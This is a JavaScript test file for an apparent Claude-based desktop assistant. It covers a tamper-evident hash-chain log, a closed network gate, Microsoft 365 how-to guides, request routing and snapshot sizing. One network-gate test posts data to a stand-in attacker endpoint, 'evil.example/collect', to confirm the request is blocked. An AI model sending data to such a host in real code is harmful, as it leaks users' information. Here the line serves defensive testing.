// Closed-system and verifiable-log tests.
import { test } from "node:test";
import assert from "node:assert/strict";
import { Ledger, verifyChain, makeClosedFetch, GENESIS } from "../core/ledger.js";
import { findGuide, guideMarkdown, GUIDES } from "../core/m365guides.js";
import { directBody } from "../core/agent.js";
import { chooseRoute, IMAGE_TOKENS } from "../core/router.js";
import { fitSize, diffScore } from "../public/screen.js";
import { renderMarkdown } from "../public/markdown.js";

test("the log is a hash chain that detects edits, deletions and reordering", async () => {
  const L = new Ledger([], { now: () => 1_700_000_000_000 });
  await L.append("session.start", { engine: "direct" });
  await L.append("network.out", { host: "api.anthropic.com", bytes: 1200, content: "secret text" });
  await L.append("session.off", { reason: "test" });
  assert.equal(L.entries[0].prev, GENESIS);
  assert.ok(!JSON.stringify(L.entries).includes("secret text"), "content fields are never logged");
  assert.equal((await verifyChain(L.entries)).ok, true);
  const edited = structuredClone(L.entries); edited[1].detail.bytes = 1;
  assert.match((await verifyChain(edited)).reason, /edited/);
  const removed = structuredClone(L.entries); removed.splice(1, 1);
  assert.equal((await verifyChain(removed)).ok, false);
  const swapped = structuredClone(L.entries); [swapped[1], swapped[2]] = [swapped[2], swapped[1]];
  assert.equal((await verifyChain(swapped)).ok, false);
  const exported = JSON.parse(L.export());
  assert.equal(exported.head, L.head);
});

test("the log keeps verifying after old entries are compacted", async () => {
  const L = new Ledger([], { limit: 10 });
  for (let i = 0; i < 25; i++) await L.append("tick", { i });
  assert.ok(L.entries.length <= 10);
  assert.equal(L.entries[0].type, "checkpoint");
  assert.equal((await verifyChain(L.entries)).ok, true);
});

test("the network gate refuses every host except api.anthropic.com and logs both", async () => {
  const L = new Ledger([]);
  const seen = [];
  const f = makeClosedFetch(L, { baseFetch: async (u) => { seen.push(u); return new Response("{}"); } });
  await f("https://api.anthropic.com/v1/messages", { method: "POST", body: JSON.stringify({ messages: [{ content: [{ type: "image" }] }] }) }, "Claude answer");
  await assert.rejects(f("https://evil.example/collect", { method: "POST", body: "x" }), (e) => e.code === "blocked_host");
  assert.deepEqual(seen, ["https://api.anthropic.com/v1/messages"], "the blocked request never left");
  await L.queue;
  const types = L.entries.map((e) => e.type);
  assert.deepEqual(types, ["network.out", "network.blocked"]);
  assert.equal(L.entries[0].detail.images, 1);
  assert.equal(L.entries[0].detail.fingerprint.length, 16);
});

test("built-in Power Automate, Forms and Excel guides match plain questions and render as checklists", () => {
  assert.equal(findGuide("How do I send Forms responses to Excel with Power Automate?").id, "pa-forms-to-excel");
  assert.equal(findGuide("walk me through an approval flow").id, "pa-approval");
  assert.equal(findGuide("my flow failed, how do I fix it").id, "pa-fix-run");
  assert.equal(findGuide("how do I use XLOOKUP").id, "xl-xlookup");
  assert.equal(findGuide("help me build a pivot of totals by center").id, "xl-pivot");
  assert.equal(findGuide("Excel is open"), null, "no guide without a how-to question");
  const md = guideMarkdown(GUIDES[0]);
  assert.match(md, /- \[ \] Go to make\.powerautomate\.com/);
  const html = renderMarkdown(md);
  assert.ok((html.match(/type="checkbox"/g) || []).length >= GUIDES[0].steps.length);
  assert.equal(chooseRoute("How do I add a drop-down list in Excel?", { engineKind: "direct", capabilities: [] }).tier, "local", "guides cost 0 tokens");
});

test("a screen snapshot is counted in the estimate and never sent without a question", () => {
  const base = { engineKind: "direct", capabilities: [], model: "claude-opus-5-5" };
  const without = chooseRoute("where is the save button?", base);
  const withPic = chooseRoute("where is the save button?", { ...base, images: 1 });
  assert.ok(withPic.estimate.input - without.estimate.input >= IMAGE_TOKENS);
  assert.ok(withPic.reasons.some((r) => /snapshot/.test(r)));
  assert.ok(withPic.estimate.costUsd > 0, "direct mode shows dollars too");
  assert.equal(chooseRoute("How do I add a drop-down list in Excel?", { ...base, images: 1 }).tier !== "local", true, "while looking, a how-to question goes to Claude with the picture");
});

test("direct requests carry the documented parameters", () => {
  const b = directBody({ system: "s", messages: [{ role: "user", content: "hi" }], tools: [{ name: "t", description: "d", input_schema: { type: "object" } }], webSearch: true, effort: "low" });
  assert.equal(b.model, "claude-opus-5-5");
  assert.deepEqual(b.thinking, { type: "adaptive" });
  assert.equal(b.output_config.effort, "low");
  assert.equal(b.max_tokens, 4000);
  assert.ok(b.tools.some((t) => t.type === "web_search_20260209"));
  assert.equal(directBody({ system: "s", messages: [], tools: [] }).tools, undefined);
});

test("snapshot sizing and change detection", () => {
  assert.deepEqual(fitSize(2560, 1440, 1280), { width: 1280, height: 720 });
  assert.deepEqual(fitSize(800, 600, 1280), { width: 800, height: 600 });
  assert.equal(diffScore(new Uint8Array([10, 10]), new Uint8Array([10, 10])), 0);
  assert.equal(diffScore(null, new Uint8Array([1])), 1);
});
